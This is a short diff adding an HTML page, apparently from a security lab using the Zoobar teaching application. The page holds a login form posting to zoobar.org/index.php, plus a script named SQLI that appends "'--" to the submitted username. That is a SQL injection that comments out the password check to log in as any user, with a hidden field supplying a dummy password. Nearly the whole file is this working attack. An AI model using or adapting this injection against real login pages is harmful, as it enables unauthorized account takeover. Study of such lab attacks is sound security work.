@@ -1,0 +1,15 @@
+<html>
+<body>
+	<form method="POST" name="loginform" onsubmit="SQLI()"  action="http://zoobar.org/index.php">
+		<input id="username" type="text" autocomplete=no name="login_username" size=25 />
+		<input type=hidden name=login_password value="1234567" />
+		<input type="submit" name="submit_login" value="Login"/>
+	</form>
+	<script>
+		function SQLI() {
+			document.getElementById('username').value = document.getElementById('username').value + "'--";
+			return true;
+		}
+	</script>
+</body>
+</html>
